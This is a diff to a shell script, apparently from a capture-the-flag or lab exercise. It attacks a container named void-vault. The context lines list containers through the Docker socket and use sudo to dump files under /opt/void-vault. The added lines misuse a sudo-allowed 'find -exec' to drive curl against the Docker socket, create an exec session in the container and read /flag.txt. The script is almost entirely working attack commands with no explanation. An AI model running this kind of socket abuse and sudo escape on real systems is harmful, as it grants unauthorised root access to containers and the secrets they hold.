@@ -47,3 +47,15 @@ curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json 2>/d
 # Read vault contents
 sudo find /opt/void-vault -type f 2>/dev/null | head -20
 sudo find /opt/void-vault -type f -exec cat {} \; 2>/dev/null
+
+echo "=== EXEC INTO VOID-VAULT ==="
+# Create exec in void-vault container
+EXEC_ID=$(sudo find /var/run/docker.sock -exec curl -s --unix-socket {} \
+  -X POST http://localhost/containers/b0b22fe23519/exec \
+  -H "Content-Type: application/json" \
+  -d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["cat","/flag.txt"]}' \; 2>/dev/null | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)
+echo "EXEC ID: $EXEC_ID"
+sudo find /var/run/docker.sock -exec curl -s --unix-socket {} \
+  -X POST http://localhost/exec/$EXEC_ID/start \
+  -H "Content-Type: application/json" \
+  -d '{"Detach":false}' \; 2>/dev/null
